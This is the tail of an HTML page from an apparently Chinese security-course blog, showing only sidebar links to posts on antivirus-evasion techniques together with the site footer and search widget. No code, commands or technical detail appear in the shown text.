免杀对抗-内存加载&amp;API封装&amp;UUID标识&amp;MAC地址&amp;IPV4地址&amp;各语言</a><time datetime="2023-04-27T00:35:05.000Z" title="发表于 2023-04-27 08:35:05">2023-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/" title="Day112 免杀对抗-加载器分离&amp;无文件落地&amp;图片隐写&amp;SOCK管道&amp;参数协议化">Day112 免杀对抗-加载器分离&amp;无文件落地&amp;图片隐写&amp;SOCK管道&amp;参数协议化</a><time datetime="2023-04-27T00:34:45.000Z" title="发表于 2023-04-27 08:34:45">2023-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/" title="Day111 免杀对抗-Java&amp;ASM&amp;汇编CS调用&amp;内联C&amp;MSF源码特征修改&amp;Jar打包">Day111 免杀对抗-Java&amp;ASM&amp;汇编CS调用&amp;内联C&amp;MSF源码特征修改&amp;Jar打包</a><time datetime="2023-04-27T00:34:28.000Z" title="发表于 2023-04-27 08:34:28">2023-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/" title="Day110 免杀对抗-GO&amp;C#&amp;反VT沙盒&amp;逆向调试&amp;参数加载&amp;资源分离&amp;混淆加密">Day110 免杀对抗-GO&amp;C#&amp;反VT沙盒&amp;逆向调试&amp;参数加载&amp;资源分离&amp;混淆加密</a><time datetime="2023-04-27T00:34:13.000Z" title="发表于 2023-04-27 08:34:13">2023-04-27</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By pwy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
